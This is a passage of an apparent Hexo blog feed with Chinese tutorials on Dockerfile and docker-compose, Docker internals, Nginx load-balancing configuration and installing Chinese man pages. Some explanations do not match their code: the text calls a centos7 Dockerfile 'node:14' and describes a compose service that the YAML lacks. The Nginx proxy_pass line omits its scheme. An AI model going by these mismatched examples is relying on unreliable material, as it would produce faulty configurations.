在镜像中安装依赖</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y \</span><br><span class="language-bash">    package1 \</span><br><span class="language-bash">    package2 \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">rm</span> -rf /var/lib/apt/lists/*</span><br><br><span class="hljs-comment"># 设置工作目录</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app</span><br><br><span class="hljs-comment"># 复制文件到镜像中</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . .</span><br><br><span class="hljs-comment"># 暴露端口</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-comment"># 容器启动时执行的命令</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;python&quot;</span>, <span class="hljs-string">&quot;app.py&quot;</span>]</span><br></code></pre></td></tr></table></figure><h3 id="构建镜像："><a href="#构建镜像：" class="headerlink" title="构建镜像："></a>构建镜像：</h3><p>在包含Dockerfile的目录中运行以下命令构建镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t myimage .<br></code></pre></td></tr></table></figure><h3 id="运行容器："><a href="#运行容器：" class="headerlink" title="运行容器："></a>运行容器：</h3><p>使用构建的镜像启动容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -d -p 8080:8080 myimage<br></code></pre></td></tr></table></figure><h2 id="Dockerfile与docker-compose配合使用"><a href="#Dockerfile与docker-compose配合使用" class="headerlink" title="Dockerfile与docker-compose配合使用"></a>Dockerfile与docker-compose配合使用</h2><p>Dockerfile 和 docker-compose.yml 可以很好地协同工作,实现自动化构建和编排容器化应用。</p><ol><li><strong>编写 Dockerfile</strong></li></ol><p>首先,根据应用需求编写 Dockerfile,定义如何构建应用镜像。例如:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> centos:centos7<br><br><span class="hljs-comment"># 从centos基础镜像构建</span><br><br><span class="hljs-comment"># 设置工作目录</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> <span class="hljs-string">&quot;/tmp&quot;</span></span><br><br><span class="hljs-comment"># 这里远程下载太慢了 我直接本地弄得。大家可以使用wget来进行远程下载</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> nginx-1.17.5.tar.gz /tmp</span><br><br><span class="hljs-comment"># 添加nginx用户</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -M -s /sbin/nologin nginx</span><br><br><span class="hljs-comment"># 安装相关依赖</span><br><span class="hljs-keyword">RUN</span><span class="language-bash">  yum -y install gcc*  make pcre-devel zlib-devel openssl openssl-devel libxslt-devel gd gd-devel GeoIP GeoIP-devel pcre pcre-devel \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">cd</span> nginx-1.17.5 \</span><br><span class="language-bash">    &amp;&amp; ./configure --user=nginx --group=nginx --prefix=/usr/local/nginx --with-file-aio --with-http_ssl_module --with-http_realip_module --with-http_addition_module --with-http_xslt_module --with-http_image_filter_module --with-http_geoip_module --with-http_sub_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_auth_request_module --with-http_random_index_module --with-http_secure_link_module --with-http_degradation_module --with-http_stub_status_module &amp;&amp; make &amp;&amp; make install \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello aoppp.com&quot;</span> &gt; /usr/local/nginx/html/index.html</span><br><br><span class="hljs-comment"># 表示对外期望暴露得端口</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br><br><span class="hljs-comment"># 启动nginx 将nginx主进程 pid为1 nginx一旦挂掉那么docker容器就会直接退出</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/usr/local/nginx/sbin/nginx&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;daemon off;&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>这个 Dockerfile 基于 node:14 镜像,安装 npm 依赖,复制应用代码,并配置启动命令。</p><ol start="2"><li><h3 id="编写-docker-compose-yml-文件"><a href="#编写-docker-compose-yml-文件" class="headerlink" title="编写 docker-compose.yml 文件"></a><strong>编写 docker-compose.yml 文件</strong></h3></li></ol><p>然后,在项目目录下创建 docker-compose.yml 文件,定义需要的服务、网络和数据卷等。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">web:</span><br>    <span class="hljs-attr">build:</span> <span class="hljs-string">./nginx</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;80:80&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/usr/share/nginx/html</span><br>      <br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">build:</span> <span class="hljs-string">./db</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-attr">MYSQL_ROOT_PASSWORD:</span> <span class="hljs-string">password</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db-data:/var/lib/mysql</span><br></code></pre></td></tr></table></figure><p>上面的配置,定义了一个名为 app 的服务,使用当前目录下的 Dockerfile 构建镜像,映射端口 3000,挂载本地代码目录作为数据卷,并设置环境变量 NODE_ENV。</p><ol start="3"><li><h3 id="使用-docker-compose-构建和运行"><a href="#使用-docker-compose-构建和运行" class="headerlink" title="使用 docker-compose 构建和运行"></a><strong>使用 docker-compose 构建和运行</strong></h3></li></ol><p>编写完成后,就可以使用 docker-compose 命令自动构建镜像并启动容器了:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up --build<br><span class="hljs-comment"># 简化 docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>–build 参数保证 Compose 总是使用最新的 Dockerfile 构建镜像。</p><p>这条命令会：</p><ul><li>自动构建 Dockerfile 定义的镜像</li><li>根据 docker-compose.yml 的配置创建容器</li><li>启动容器</li><li>映射端口等</li></ul><p>这样 docker-compose up -d就会同时启动 web 和 db 服务了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Docker Compose 是一个用于定义和运行多容器 Docker 应用程序的工具。允许使用 YAML 文件来配置应用程序的服务,然后使用单个命令部署和启动所有服务。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;YAML 配置文件&lt;/strong&gt;:&lt;/p&gt;
&lt;ul</summary>
      
    
    
    
    
    <category term="Docker" scheme="http://example.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Docker基础</title>
    <link href="http://example.com/2024/04/07/Docker%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/04/07/Docker%E5%9F%BA%E7%A1%80/</id>
    <published>2024-04-07T06:55:16.000Z</published>
    <updated>2024-04-07T08:10:48.595Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Docker-底层原理"><a href="#Docker-底层原理" class="headerlink" title="Docker 底层原理"></a>Docker 底层原理</h1><h2 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h2><ol><li><p><strong>命名空间(Namespaces)</strong></p><p> Docker 利用 Linux 内核的命名空间技术,为容器提供了一个独立的运行环境。主要包括以下几种命名空间:</p><ul><li>PID 命名空间:为容器提供独立的进程视图。</li><li>Network 命名空间:为容器提供独立的网络栈。</li><li>IPC 命名空间:为容器提供独立的进程间通信。</li><li>Mount 命名空间:为容器提供独立的挂载点视图。</li><li>UTS 命名空间:为容器提供独立的主机和域名。</li></ul></li><li><p><strong>控制组(cgroups)</strong>: Docker 使用 Linux 内核的 cgroups 功能,对容器的资源使用进行限制和隔离,如 CPU、内存、磁盘 I&#x2F;O 等。</p></li><li><p><strong>联合文件系统(UnionFS)</strong>: Docker 使用联合文件系统技术,支持为容器构建分层的文件系统。每层文件系统被称为一个 layer,新建容器时,Docker 会利用这些 layer 快速构建一个新的文件系统。</p></li></ol><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>Docker 采用了 <code>C/S</code> 架构，包括客户端和服务端。Docker 守护进程 （<code>Daemon</code>）作为服务端接受来自客户端的请求，并处理这些请求（创建、运行、分发容器）。</p><p>客户端和服务端既可以运行在一个机器上，也可通过 <code>socket</code> 或者 <code>RESTful API</code> 来进行通信。Docker 守护进程一般在宿主主机后台运行，等待接收来自客户端的消息。Docker 客户端则为用户提供一系列可执行命令，用户用这些命令实现跟 Docker 守护进程交互。</p><p><img src="/img/course/v7N8wg4sy3.png" alt="v7N8wg4sy3"></p><h3 id="Docker-架构"><a href="#Docker-架构" class="headerlink" title="Docker 架构"></a>Docker 架构</h3><p>Docker 包括三个基本概念:</p><p>镜像（Image）：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。<br>容器（Container）：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。<br>仓库（Repository）：仓库可看成一个代码控制中心，用来保存镜像。</p><table><thead><tr><th>概念</th><th>说明</th></tr></thead><tbody><tr><td>Docker 镜像(Images)</td><td>Docker 镜像是用于创建 Docker 容器的模板,比如 Ubuntu 系统。</td></tr><tr><td>Docker 容器(Container)</td><td>容器是独立运行的一个或一组应用,是镜像运行时的实体。</td></tr><tr><td>Docker 客户端(Client)</td><td>Docker 客户端通过命令行或者其他工具使用 Docker SDK (<a href="https://docs.docker.com/develop/sdk/">https://docs.docker.com/develop/sdk/</a>) 与 Docker 的守护进程通信。</td></tr><tr><td>Docker 主机(Host)</td><td>一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。</td></tr><tr><td>Docker Registry</td><td>Docker 仓库用来保存镜像,可以理解为代码控制中的代码仓库。Docker Hub(<a href="https://hub.docker.com/">https://hub.docker.com</a>) 提供了庞大的镜像集合供使用。一个 Docker Registry 中可以包含多个仓库（Repository）;每个仓库可以包含多个标签（Tag）;每个标签对应一个镜像。通常,一个仓库会包含同一个软件不同版本的镜像,而标签就常用于对应该软件的各个版本。我们可以通过 &lt;仓库名&gt;:&lt;标签&gt; 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签,将以 latest 作为默认标签。</td></tr></tbody></table><h2 id="与VM虚拟机的不同"><a href="#与VM虚拟机的不同" class="headerlink" title="与VM虚拟机的不同"></a>与VM虚拟机的不同</h2><p>1、docker有着比虚拟机更少的抽象层。由亍docker不需要Hypervisor实现硬件资源虚拟化,运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在效率上有明显优势。<br>2、docker利用的是宿主机的内核,而不需要Guest OS。因此,当新建一个容器时,docker不需要和虚拟机一样重新加载一个操作系统内核。仍而避免引寻、加载操作系统内核返个比较费时费资源的过程,当新建一个虚拟机时,虚拟机软件需要加载Guest OS,返个新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统,则省略了返个过程,因此新建一个docker容器只需要几秒钟。</p><p><img src="/img/course/20210211165803163.png" alt="20210211165803163"></p><h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><table><thead><tr><th>命令</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>docker run</code></td><td>创建并运行一个新容器</td><td><code>docker run -d -p 80:80 nginx</code> - 以后台模式运行一个 Nginx 容器,并将主机 80 端口映射到容器的 80 端口</td></tr><tr><td><code>docker start/stop/restart</code></td><td>启动、停止、重启一个容器</td><td><code>docker stop mycontainer</code> - 停止名为 “mycontainer” 的容器</td></tr><tr><td><code>docker ps</code></td><td>列出所有正在运行的容器</td><td><code>docker ps</code> - 列出所有正在运行的容器</td></tr><tr><td><code>docker images</code></td><td>列出本地所有的 Docker 镜像</td><td><code>docker images</code> - 列出所有本地的 Docker 镜像</td></tr><tr><td><code>docker pull</code></td><td>从 Docker Registry 拉取一个镜像</td><td><code>docker pull ubuntu:18.04</code> - 从 Docker Hub 拉取 Ubuntu 18.04 镜像</td></tr><tr><td><code>docker build</code></td><td>根据 Dockerfile 构建一个新的镜像</td><td><code>docker build -t myapp .</code> - 使用当前目录下的 Dockerfile 构建一个名为 “myapp” 的镜像</td></tr><tr><td><code>docker commit</code></td><td>基于一个容器创建一个新的镜像</td><td><code>docker commit -m &quot;Added feature X&quot; mycontainer myusername/myimage:v1</code> - 基于名为 “mycontainer” 的容器创建一个新的镜像</td></tr><tr><td><code>docker push</code></td><td>将一个镜像上传到 Docker Registry</td><td><code>docker push myusername/myimage:v1</code> - 将本地的 “myimage:v1” 镜像上传到 Docker Hub</td></tr><tr><td><code>docker rmi</code></td><td>删除一个或多个本地镜像</td><td><code>docker rmi nginx:latest</code> - 删除 “nginx:latest” 镜像</td></tr><tr><td><code>docker rm</code></td><td>删除一个或多个容器</td><td><code>docker rm mycontainer</code> - 删除名为 “mycontainer” 的容器</td></tr><tr><td><code>docker exec</code></td><td>在一个已经运行的容器内执行命令</td><td><code>docker exec -it mycontainer bash</code> - 在名为 “mycontainer” 的容器内执行 Bash 命令</td></tr><tr><td><code>docker logs</code></td><td>查看容器的日志输出</td><td><code>docker logs mycontainer</code> - 查看名为 “mycontainer” 的容器的日志</td></tr><tr><td><code>docker network</code></td><td>管理 Docker 网络</td><td><code>docker network create mynetwork</code> - 创建一个名为 “mynetwork” 的自定义网络</td></tr><tr><td><code>docker volume</code></td><td>管理 Docker 数据卷</td><td><code>docker volume create myvolume</code> - 创建一个名为 “myvolume” 的数据卷</td></tr></tbody></table><p>引用文章：</p><blockquote><p><a href="https://blog.csdn.net/bbj12345678/article/details/113790971">https://blog.csdn.net/bbj12345678/article/details/113790971</a></p><p><a href="https://juejin.cn/post/7267477662360010767">https://juejin.cn/post/7267477662360010767</a></p><p><a href="https://blog.csdn.net/crazymakercircle/article/details/120747767">https://blog.csdn.net/crazymakercircle/article/details/120747767</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Docker-底层原理&quot;&gt;&lt;a href=&quot;#Docker-底层原理&quot; class=&quot;headerlink&quot; title=&quot;Docker 底层原理&quot;&gt;&lt;/a&gt;Docker 底层原理&lt;/h1&gt;&lt;h2 id=&quot;关键技术&quot;&gt;&lt;a href=&quot;#关键技术&quot; class=&quot;</summary>
      
    
    
    
    
    <category term="Docker" scheme="http://example.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Nginx负载均衡配置</title>
    <link href="http://example.com/2024/03/17/Nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2024/03/17/Nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E9%85%8D%E7%BD%AE/</id>
    <published>2024-03-17T08:02:11.000Z</published>
    <updated>2024-03-18T12:52:46.127Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nginx负载均衡配置"><a href="#Nginx负载均衡配置" class="headerlink" title="Nginx负载均衡配置"></a>Nginx负载均衡配置</h1><p>Nginx是一个高性能的开源Web服务器，也可以用作反向代理服务器、负载均衡器和HTTP缓存。</p><h2 id="负载均衡（load-balancing）"><a href="#负载均衡（load-balancing）" class="headerlink" title="负载均衡（load balancing）"></a>负载均衡（load balancing）</h2><p>负载均衡是一种电子计算机技术，用来在多个计算机（计算机集群）、网络连接、CPU、磁盘驱动器或其他资源中分配负载，以达到优化资源使用、最大化吞吐率、最小化响应时间、同时避免过载的目的。 使用带有负载平衡的多个服务器组件，取代单一的组件，可以通过冗余提高可靠性。</p><h2 id="负载均衡作用"><a href="#负载均衡作用" class="headerlink" title="负载均衡作用"></a>负载均衡作用</h2><ol><li><strong>提高系统可用性(Availability)</strong> 通过在多台服务器上部署相同的应用,当某一台服务器出现故障时,负载均衡器会自动将请求转发到其他正常工作的服务器,从而保证了整个系统的高可用性。</li><li><strong>提升系统扩展能力(Scalability)</strong> 随着访问量的增长,可以通过平滑地添加更多的服务器来分担负载压力,负载均衡器会自动将新加入的服务器纳入到集群中。这种无缝扩展让系统能够适应不断变化的访问量。</li><li><strong>增加吞吐量(Throughput)</strong> 将负载分布到多台服务器上,利用总体的计算资源,可以显著提升系统的吞吐量和响应速度。</li><li><strong>消除单点故障(Eliminate Single Point of Failure)</strong> 单个服务器是单点故障的风险,通过负载均衡将请求分发到多台服务器上,避免了单点故障导致的服务中断。</li><li><strong>复用昂贵资源</strong> 一些昂贵的资源如数据库、文件服务器等可以在一组服务器之间共享,从而更高效地利用这些资源。</li><li><strong>安全</strong> 负载均衡器通常位于网络边缘,可以为内部服务器实施一些安全策略,如过滤恶意请求、阻挡DOS攻击等。</li></ol><h2 id="负载均衡算法"><a href="#负载均衡算法" class="headerlink" title="负载均衡算法"></a>负载均衡算法</h2><ol><li><strong>轮询（Round Robin）</strong>：按照顺序将每个新的请求分配给下一个服务器。这种算法简单且公平，适用于每台服务器性能相近的情况。</li><li><strong>最少连接（Least Connections）</strong>：将新的请求分配给当前连接数最少的服务器，以确保负载更均衡。适用于每个连接处理时间不同的情况。</li><li><strong>加权轮询（Weighted Round Robin）</strong>：给每台服务器分配一个权重，根据权重比例决定分配请求的次数。权重高的服务器会获得更多的请求，适用于服务器性能不均的情况。</li><li><strong>加权最少连接（Weighted Least Connections）</strong>：结合了加权和最少连接的概念，根据服务器的权重和当前连接数来分配请求。</li><li><strong>IP哈希（IP Hash）</strong>：根据客户端的IP地址计算哈希值，然后将请求分配给对应哈希值的服务器。这样可以确保同一客户端的请求始终被发送到同一台服务器，保持会话一致性。</li><li><strong>响应时间加权（Response Time Weighted）</strong>：根据服务器的响应时间来分配请求，响应时间短的服务器会获得更多的请求。</li><li><strong>最少流量（Least Traffic）</strong>：将请求发送到当前流量最小的服务器，以保持服务器的负载均衡。</li><li><strong>随机算法（Random）</strong>：随机选择一个服务器来处理请求，适用于简单的负载均衡需求。</li></ol><p>具体介绍参考<a href="https://www.alibabacloud.com/help/zh/slb/product-overview/introduction-to-load-balancing-scheduling-algorithm">负载均衡调度算法介绍</a></p><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p><strong>负载服务器与后端服务器组均安装启动Nginx服务</strong>，<a href="https://blog.51cto.com/u_16099268/9789949">安装方法参考</a></p><h2 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h2><h3 id="查看Nginx版本："><a href="#查看Nginx版本：" class="headerlink" title="查看Nginx版本："></a>查看Nginx版本：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nginx -v<br></code></pre></td></tr></table></figure><p><strong>默认 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf 为nginx配置文件，打开进行配置</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/nginx/nginx.conf<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">events &#123;         <span class="hljs-comment">#events块</span><br>   <span class="hljs-string">...</span><br>&#125;<br><br>http      <span class="hljs-comment">#http块</span><br>&#123;<br>    <span class="hljs-string">...</span>   <span class="hljs-comment">#http全局块</span><br>    server        <span class="hljs-comment">#server块</span><br>    &#123; <br>        <span class="hljs-string">...</span>       <span class="hljs-comment">#server全局块</span><br>        location [PATTERN]   <span class="hljs-comment">#location块</span><br>        &#123;<br>            <span class="hljs-string">...</span><br>        &#125;<br>        location [PATTERN] <br>        &#123;<br>            <span class="hljs-string">...</span><br>        &#125;<br>    &#125;<br>    server<br>    &#123;<br>      <span class="hljs-string">...</span><br>    &#125;<br>    <span class="hljs-string">...</span>     <span class="hljs-comment">#http全局块</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="在http代码块内添加名为load-balancing的负载均衡组，并添加一个服务器块："><a href="#在http代码块内添加名为load-balancing的负载均衡组，并添加一个服务器块：" class="headerlink" title="在http代码块内添加名为load.balancing的负载均衡组，并添加一个服务器块："></a>在http代码块内添加名为load.balancing的负载均衡组，并添加一个服务器块：</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs axapta">http &#123;<br>  upstream load.balancing &#123;<br>    <span class="hljs-meta"># 采用 ip_hash 负载均衡策略</span><br>    ip_hash;<br>    <span class="hljs-meta"># 负载均衡目的服务地址</span><br>    <span class="hljs-keyword">server</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">81</span>;<br>    <span class="hljs-keyword">server</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">82</span>;<br>    <span class="hljs-keyword">server</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">83</span> weight=<span class="hljs-number">10</span>;  <span class="hljs-meta"># weight 方式，不写默认为 1</span><br>  &#125;<br><br>  <span class="hljs-keyword">server</span> &#123;<br>  <span class="hljs-meta">#指定监听的端口</span><br>  listen <span class="hljs-number">8080</span>;<br>  <span class="hljs-meta">#指定域名</span><br>  server_name example.com;<br>    location / &#123;<br>      proxy_pass load.balancing;<br>      proxy_connect_timeout <span class="hljs-number">10</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>检查Nginx配置文件语法</strong>：在保存修改后，需要检查Nginx配置文件的语法是否正确。可以使用以下命令进行语法检查：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nginx -t<br></code></pre></td></tr></table></figure><p><strong>重启Nginx服务器</strong>：重新加载Nginx配置并重启Nginx服务器（使新的配置生效，而不会中断正在处理的连接）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl reload nginx<br></code></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><strong>访问<a href="http://your_server_ip:8080，观察配置是否生效">http://your_server_ip:8080，观察配置是否生效</a></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Nginx负载均衡配置&quot;&gt;&lt;a href=&quot;#Nginx负载均衡配置&quot; class=&quot;headerlink&quot; title=&quot;Nginx负载均衡配置&quot;&gt;&lt;/a&gt;Nginx负载均衡配置&lt;/h1&gt;&lt;p&gt;Nginx是一个高性能的开源Web服务器，也可以用作反向代理服务器、</summary>
      
    
    
    
    
    <category term="服务器运维" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Linux下中文版man命令--manpages-zh</title>
    <link href="http://example.com/2024/03/16/Linux%E4%B8%8B%E4%B8%AD%E6%96%87%E7%89%88man%E5%91%BD%E4%BB%A4-manpages-zh/"/>
    <id>http://example.com/2024/03/16/Linux%E4%B8%8B%E4%B8%AD%E6%96%87%E7%89%88man%E5%91%BD%E4%BB%A4-manpages-zh/</id>
    <published>2024-03-16T13:32:18.000Z</published>
    <updated>2024-03-16T14:29:44.647Z</updated>
    
    <content type="html"><![CDATA[<p>在Linux下使用man查看命令帮助，命令的词典。但默认的英文解释可能不便于理解。</p><h2 id="安装manpages-zh可以查看中文解释"><a href="#安装manpages-zh可以查看中文解释" class="headerlink" title="安装manpages-zh可以查看中文解释"></a>安装manpages-zh可以查看中文解释</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p><strong>使用安装命令</strong></p><p>Debian &#x2F; Ubuntu:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt update<br>sudo apt install manpages-zh<br></code></pre></td></tr></table></figure><p>Arch Linux:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">pacman -Syu<br>pacman -S man-pages-zh_cn man-pages-zh_tw<br></code></pre></td></tr></table></figure><p>Red Hat &#x2F; CentOS:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum update<br>yum install man-pages-zh-CN<br></code></pre></td></tr></table></figure><p>Fedora:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dnf update<br>dnf install man-pages-zh-CN<br></code></pre></td></tr></table></figure><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p><strong>下载源码编译安装</strong></p><p>参考GitHub项目 <a href="https://github.com/man-pages-zh/manpages-zh"><strong>manpages-zh</strong></a></p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>可能出现的报错警告：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">perl: warning: Setting locale failed.                                                                                                                                                      <br>perl: warning: Please check that your locale settings:                                                                                                                                     <br>        LANGUAGE = (unset),                                                                                                                                                                <br>        LC_ALL = (unset),                                                                                                                                                                  <br>        LC_MESSAGES = &quot;zh_CN.UTF-8&quot;,                                                                                                                                                       <br>        LANG = &quot;en_US.UTF-8&quot;            <br></code></pre></td></tr></table></figure><p><strong>原因</strong>：下载后如果系统并非中文环境，则还需要调整环境变量才能使用。</p><h3 id="特定会话中设置语言环境变量为中文（仅在此次登录的shell中使用）："><a href="#特定会话中设置语言环境变量为中文（仅在此次登录的shell中使用）：" class="headerlink" title="特定会话中设置语言环境变量为中文（仅在此次登录的shell中使用）："></a>特定会话中设置语言环境变量为中文（仅在此次登录的shell中使用）：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">export LANG=&quot;zh_CN.UTF-8&quot;<br></code></pre></td></tr></table></figure><h3 id="永久更改系统的本地化设置："><a href="#永久更改系统的本地化设置：" class="headerlink" title="永久更改系统的本地化设置："></a>永久更改系统的本地化设置：</h3><p>1.在 <code>~/.bashrc</code> 文件中设置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;LANG=&quot;zh_CN.UTF-8&quot;&#x27; &gt;&gt; ~/.bashrc<br></code></pre></td></tr></table></figure><p>2.运行以下命令使更改生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> 